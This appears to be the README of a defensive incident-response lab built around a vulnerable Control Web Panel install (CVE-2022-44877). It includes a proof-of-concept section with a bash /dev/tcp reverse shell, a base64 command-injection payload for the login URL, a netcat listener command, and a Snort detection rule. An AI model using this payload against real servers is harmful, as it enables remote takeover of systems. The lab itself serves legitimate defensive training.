# Description

**This exercise is meant for blue teams who want to learn about network security, forensics and system hardening.**

In this scenario, we respond to a cybersecurity incident in a server suspected of being compromised.
We are given a snapshot of the machine after the incident and a `pcap` file with traffic from a narrowed time window.
Thus, we are asked to analyse the pcap file to identify the cyber kill chain of the attack, find evidences of compromise in the snapshot, and propose system hardening methods to mitigate this vulnerability and further risks.
The hardening methods should include firewall and Intrusion Detection System (IDS) rules, and a small report of the issues in the system.

The laboratory setup contains a vulnerable version of Control Web Panel ([CWP](https://control-webpanel.com/)) - v0.9.8.1146 - on CentOS7.
In addition, the lab includes a `.pcap` file captured with Wireshark from a privileged vantage point.
The pcap file contains evidence of this attack and mallicious activity comming from the CentOS machine.

## Installation

First, install the following plugins:

```bash
vagrant plugin install vagrant-reload
vagrant plugin install vagrant-vbguest
```

Run `vagrant up` to create and provision the virtual machine. Then you can access the Control Web Panel [CWP](https://control-webpanel.com/) by navigating to http://192.168.50.10:2031 if you need to.
The credentials are set as default.

- username: root
- password: vagrant

The CWP installation is set to version `0.9.8.1146` which contains a known vulnerability ([CVE-2022-44877](https://nvd.nist.gov/vuln/detail/CVE-2022-44877)) in the login page leading to remote code execution.

<details open>
    <summary><b>CVE-2022-44877 PoC</b></summary>

> NOTE: Understanding the vulnerability will give you an advantage in this laboratory.
> If you want to exploit the machine yourself, we suggest you read more about the vulnerability **afterwards**.

To exploit this vulnerability, we only need to know some user in the system, for example `root`.
The password is not necessary.
The process is rather simple:

1. Capture the `POST` sent with the login form with the username `root` parameter (most installations run on a privileged user) and a random password (e.g., `pwned`). I like to use [BurpSuite](https://portswigger.net/burp) for this things; although, you can just resend the request using Firefox.
2. We will insert our commands in the login parameter of the url (`/login/index.php?login=`).
3. Craft a reversed shell that we can input in the url:
   1. A simple reverse shell will suffice: `sh -i >& /dev/tcp/<our ip address>/<listening port> 0>&1`
      - `sh -i`: Start a new shell in interactive mode
      - `>&`: Redirects the output to our address (gives back our commands output)
      - `/dev/tcp/<our ip address>/<listening port>`: Where we are listening (a TCP connection in our address and port).
      - `0>&1`: It gives back our command aswell.
   2. Encode the reverse shell in [Base64](https://www.base64encode.org/) so we can use it in the url
   3. Craft the url to run the command in the terminal (payload)
      1. To run a command that starts our shell, we can send something like `echo <encoded base64 reverse shell> | base64 -d | bash`. This will decode our string and pipe our message to the terminal as a command, starting the reverse shell with our machine. Since we can not use spaces in the url, we can replace them with the metatag `${IFS}`, giving the following:

            ```shell
            $(echo${IFS}<encoded base64 reverse shell>${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)
            ```

        - `echo`: Displays text passed as arguments
        - `base64 -d`: Decode the piped message
        - `bash` Execute the piped string as a command

4. Start your listener in your machine and send the request with the payload
   - You can use a simple docker image with a [netcat](https://netcat.sourceforge.net/) listener (I like to use port 9001):

     ```shell
     docker run -p 9001:9001 -it --rm alpine /bin/sh -c "nc -nvlp 9001"
     ```

   - Otherwise, you can use this Netcat command: `nc -nlvp 9001`
     - `-l`: listen mode
     - `-n`: without DNS resolution
     - `-v`: verbose
     - `-p 9001`: listen in port 9001

</details>

## Objectives

This lab aims for the following objectives:

1. Identify the attack kill chain
2. Perform small forensics to find evidences of compromise
3. Create firewall rules to mitigate some of the issues
4. Create IDS rules
5. Identify issues within the system

### 1. Identify the attack Kill Chain

Use [Wireshark](https://www.wireshark.org/) in your machine to analyse the `pcap` file.
The goal is to identify the attack to understand how the attacker exploited the machine.

### 2. Forensics

Check the logs to find evidences of the compromise.
The log files for CWP are located in `/var/log/cwp_client_login.log`.
In addition, check the terminal history to analyse how the attacker behaved inside the machine.

### 3. Firewall rules

### 4. IDS rules

For this part, use [Snort](https://www.snort.org/) to create rules that mitigate this attack.
Then, replay the `pcap` file to make sure your rules identify this attack successfuly.

For example:

```bash
alert tcp any any -> any any (msg:"Possible CVE-2022-44877 exploitation attempt"; content:"GET /"; content:".php?login=$"; content:" HTTP/"; sid:1000001; rev:1;)
```

This rule looks for HTTP GET requests that contain the string `.php?login=$` in the URI, which is a known characteristic of the `CVE-2022-44877` vulnerability. When such traffic is detected, the rule generates an alert with the message `Possible CVE-2022-44877 exploitation attempt`.

> **NOTE**: Use this rule as the base. This specific example does not prevent this attack, but rather limit all authentication.

### 5. System Hardening

Install and run [Lynis](https://cisofy.com/lynis/) in the snapshot to create a report of the system vulnerabilities.
